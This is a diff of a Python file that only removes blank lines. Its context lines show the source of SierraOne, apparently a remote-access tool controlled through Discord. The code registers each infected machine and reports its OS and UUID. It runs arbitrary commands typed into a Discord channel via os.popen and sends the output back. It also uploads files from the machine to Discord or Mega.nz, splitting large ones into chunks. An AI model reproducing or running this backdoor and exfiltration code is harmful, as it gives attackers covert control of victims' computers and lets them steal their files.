@@ -50,10 +50,8 @@ async def on_ready():
 # Create 'SierraOne' category
 async def create_category(guild):
     category = discord.utils.get(guild.categories, name=category_prefix)
-
     if not category:
         category = await guild.create_category(category_prefix)
-
     return category
 
 
@@ -78,7 +76,6 @@ async def next_channel(channels):
                 channel_number = name.split("-")[2]
                 if channel_number.isdigit():
                     numbers.append(int(channel_number))
-
         return max(numbers) + 1
 
     except ValueError:
@@ -94,10 +91,8 @@ async def machine_info():
         for line in get_UUID:
             UUID = " ".join(get_UUID.split())
             machine_UUID = UUID[5:]
-    
     elif platform.system() == "Linux":
         machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
-    
     elif platform.system() == "Darwin":
         machine_UUID = str(subprocess.check_output([
                                                     "ioreg",
@@ -113,14 +108,12 @@ async def machine_info():
     
     else:
         machine_UUID = str("Unknown")
-
     message = discord.Embed(title="Machine Info", type="rich")
     message.add_field(name="Operating System", value=platform.system())
     message.add_field(name="UUID", value=machine_UUID)
 
     # Non-embed alternative
     # message = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
-
     return message
 
 
@@ -146,17 +139,13 @@ async def shell_input(channel, message):
                 if os.path.getsize(message.content[7:]) <= discord_limit:
                     await message.channel.send(f"Uploading `{message.content[7:]}`, standby...")
                     await message.channel.send(file=discord.File(message.content[7:]))
-
                 elif discord_limit < os.path.getsize(message.content[7:]) <= sierraone_limit:
                     # Check if Mega.nz credentials are present. If not, split the file into 7.5 MB chunks and upload them over Discord
                     if config.mega_email != "" and config.mega_password != "":
                         await message.channel.send(f"Uploading `{message.content[7:]}` to Mega, standby...")
-                        
                         mega_file = mega_nz.upload(message.content[7:])
                         mega_link = mega_nz.get_upload_link(mega_file)
-
                         await message.channel.send(f"Your Mega link: {mega_link}")
-
                     else:
                         await message.channel.send("Splitting your file and uploading the parts, standby...")
 
@@ -172,14 +161,12 @@ async def shell_input(channel, message):
                                 
                                 chunk = file.read(7864320)
                                 i += 1
-
                 else:
                     await message.channel.send("File is too big (> 32 MB)")
 
             except FileNotFoundError:
                 # Notify the user if the requested file was not found
                 await message.channel.send("File not found")
-
         elif message.content.startswith("cd"):
             # Change directories
             os.chdir(message.content[3:])
@@ -199,13 +186,11 @@ async def shell_input(channel, message):
             try:
                 # Try to read the user's input
                 user_input = os.popen(message.content).read()
-
             except:
                 print("OS POPEN exception!")
 
             if user_input == "":
                 await message.channel.send("The command did not return anything")
-            
             else:
                 paginator = discord.ext.commands.Paginator(prefix="```", suffix="```")
 
@@ -217,7 +202,6 @@ async def shell_input(channel, message):
 
                 for page in paginator.pages:
                     await message.channel.send(f"{page}")
-
     else:
         return
 
